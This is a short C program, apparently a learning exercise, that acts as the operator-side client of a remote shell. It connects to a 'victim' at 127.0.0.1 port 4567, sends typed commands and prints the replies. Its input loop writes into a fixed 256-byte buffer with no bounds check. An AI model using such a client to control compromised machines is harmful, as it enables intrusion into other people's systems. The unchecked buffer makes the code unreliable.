#include <stdio.h>
#include <netinet/in.h> // for struct info
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
/*  Comments
- connect()   If succeeds, zero is returned.  On error, -1 is returned 
*/

int main(){
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0); 
    struct sockaddr_in victim_address;
    victim_address.sin_family = AF_INET;
    victim_address.sin_port=htons(4567);
    inet_aton("127.0.0.1", &victim_address.sin_addr.s_addr); // convert to binary
    // victim_address.sin_zero  ; // optional: we could zeros the full sturct then add our values and the reaminder will be 0
    int connection_state = connect(socket_fd, (struct sockaddr*) &victim_address, 16 ); 

    if(connection_state == 0) printf("[+] Connected Successfully ! [+]\n"); // ; else exit(1);
    while(1){
        char command[256];
        printf("$: ");
        int len = 0;
        scanf("%c", &command[len]);
        while(command[len] != '\n'){
            len++;
            scanf("%c", &command[len]);
        }
        command[len] = '\n';
        command[len+1] = '\0';
        send(socket_fd, command, len+1, 0);
        char messg[1080];
        int bytes = recv(socket_fd, messg, sizeof(messg) - 1, 0);
        messg[bytes] = '\0';
        printf("%s\n", messg);
    }
    return 0;

}